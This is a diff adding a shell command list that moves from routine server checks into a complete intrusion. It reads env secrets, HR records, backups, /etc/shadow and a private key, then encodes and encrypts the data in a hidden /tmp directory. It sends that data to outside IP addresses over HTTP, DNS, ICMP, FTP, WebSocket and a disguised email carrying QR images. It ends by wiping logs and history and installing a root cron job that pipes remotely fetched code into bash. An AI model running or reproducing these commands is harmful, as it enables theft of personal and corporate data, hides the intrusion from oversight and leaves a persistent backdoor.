@@ -1,0 +1,64 @@
+systemctl status nginx
+df -h
+free -m
+journalctl -u gunicorn --since "2 hours ago" | tail -30
+tail -f /var/log/nginx/access.log
+id
+whoami
+hostname
+uname -a
+cat /etc/os-release
+ip addr show eth0
+ip route
+ss -tlnp
+ps aux --forest
+cat /etc/hostname
+cat /etc/passwd | head -20
+find / -name "*.env" -readable 2>/dev/null
+find /opt -type f 2>/dev/null | head -40
+ls -la /opt/
+ls -la /opt/app/
+ls -la /opt/app/config/
+cat /opt/app/config/production.env
+ls -la /opt/hr/
+head -3 /opt/hr/employee_records.csv
+cat /opt/hr/employee_records.csv
+find /var/backups -type f 2>/dev/null
+cat /var/backups/data.dump
+ls /opt/finance/
+ls -la /srv/app/releases/
+cat /srv/app/releases/release-notes.txt
+cat /etc/shadow 2>/dev/null | head -5
+cat /etc/ssl/private/server.key 2>/dev/null || echo "permission denied"
+mkdir -p /tmp/.s
+chmod 700 /tmp/.s
+KEY1=$(printf 'bWFuZ28tNDc=' | base64 -d)
+python3 -c 'import os; k=os.environ["KEY1"].encode(); d=open("/opt/app/config/production.env","rb").read(); open("/tmp/.s/p1.dat","wb").write(bytes(b^k[i%len(k)] for i,b in enumerate(d)))'
+KEY4=$(printf 'cmF2ZW4tMTk=' | base64 -d)
+base32 < /opt/hr/employee_records.csv | tr -d '\n' | fold -w 30 > /tmp/.s/p2.dat
+curl -s -X POST --data-binary @/tmp/.s/p1.dat \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  http://198.244.146.163/api/update
+python3 /tmp/.s/dns_file_transfer.py Base32 /tmp/.s/p2.dat 66.132.172.130 npmjs-registry.net
+python3 /tmp/.s/gen_qr.py /tmp/.s/p3_src.dat 3 /tmp/.s/
+ls /tmp/.s/q*.png
+python3 -c 'import smtplib;from email.message import EmailMessage;m=EmailMessage();m["From"]="svc-reports@prod-web-03.internal";m["To"]="finance.archive@external.example";m["Subject"]="Monthly Reconciliation Report - September 2026";m.set_content("Please find attached the monthly reconciliation documents for September 2026.\nFiles require finance team review by EOD Friday.");[m.add_attachment(open(f,"rb").read(),maintype="image",subtype="png",filename=f.split("/")[-1]) for f in ["/tmp/.s/q1.png","/tmp/.s/q2.png","/tmp/.s/q3.png"]];s=smtplib.SMTP("20.122.142.214",25);s.send_message(m);s.quit()'
+python3 -c 'import os; k=os.environ["KEY4"].encode(); d=open("/var/backups/data.dump","rb").read(); print(bytes(b^k[i%len(k)] for i,b in enumerate(d)).hex())' > /tmp/.s/p4.dat
+python3 /tmp/.s/send_icmp.py --encode 'hex' /tmp/.s/p4.dat 221.162.63.50
+KEY6=$(printf 'U3Rvcm0tV2luZC0yMDI2' | base64 -d)
+7z a -tgzip /tmp/.s/p5_raw.gz /opt/finance/q3_forecast.xlsx 2>/dev/null
+base64 /tmp/.s/p5_raw.gz > /tmp/.s/p5.dat
+openssl enc -aes-256-cbc -salt -md sha256 -pass "pass:${KEY6}" \
+  -in /srv/app/releases/release-notes.txt -out /tmp/.s/r.enc 2>/dev/null
+base64 /tmp/.s/r.enc > /tmp/.s/p6.dat
+curl --ftp-pasv -u 'svc_backup:DailyBackup!2026' -T /tmp/.s/p5.dat 'ftp://198.244.146.163/daily_metrics.dat'
+python3 /tmp/.s/send_thru_WS.py /tmp/.s/p6.dat 66.132.172.130 8080 /ws/metrics
+ls -la /tmp/.s/
+wc -c /tmp/.s/*.dat /tmp/.s/*.png
+rm -f /tmp/.s/p5_raw.gz /tmp/.s/r.enc /tmp/.s/p1.dat /tmp/.s/p4.dat
+find /var/log -name "*.log" -exec truncate -s 0 {} + 2>/dev/null
+history -c
+echo "* * * * * root /usr/bin/curl -s http://198.244.146.163/api/ping 2>/dev/null | /bin/bash" \
+  > /etc/cron.d/sys-health-check
+chmod 644 /etc/cron.d/sys-health-check
+cat /etc/cron.d/sys-health-check
